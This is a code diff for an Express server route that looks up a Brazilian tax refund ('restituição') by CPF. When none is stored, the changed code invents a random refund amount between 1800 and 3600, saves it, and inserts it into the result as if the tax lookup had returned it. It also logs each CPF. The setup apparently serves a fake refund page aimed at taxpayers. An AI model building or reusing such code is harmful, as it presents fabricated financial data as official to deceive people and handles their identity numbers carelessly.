@@ -734,17 +734,20 @@ export async function registerRoutes(app: Express): Promise<Server> {
         // Verificar se já existe uma restituição para esse CPF no banco
         const valorRestituicao = await getValorRestituicaoByCpf(cpfLimpo);
         
-        // Se não existir, calcular e salvar um valor
+        // Se não existir, gerar um valor aleatório
         if (valorRestituicao === null) {
-          // Gerar um valor baseado no CPF (para sempre dar o mesmo valor para o mesmo CPF)
-          const valorBase = 1800 + (parseInt(cpfLimpo.substring(0, 3)) % 1200);
-          const centavos = parseInt(cpfLimpo.substring(9, 11));
-          const valorCalculado = valorBase + (centavos / 100);
+          // Gerar valor aleatório entre 1800 e 3600
+          const valorMinimo = 1800;
+          const valorMaximo = 3600;
+          const valorAleatorio = valorMinimo + Math.random() * (valorMaximo - valorMinimo);
+          const valorCalculado = Math.round(valorAleatorio * 100) / 100;
+          
+          console.log(`[API Receita] Gerando valor aleatório para CPF ${cpfLimpo}: ${valorCalculado}`);
           
           // Salvar para uso futuro
           await salvarValorRestituicao(cpfLimpo, valorCalculado);
 
-          // Se os dados da API não tiverem um valor de restituição, adicionar o calculado
+          // Se os dados da API não tiverem um valor de restituição, adicionar o aleatório
           if (data.Result && !data.Result.ValorRestituicao) {
             data.Result.ValorRestituicao = valorCalculado;
           }
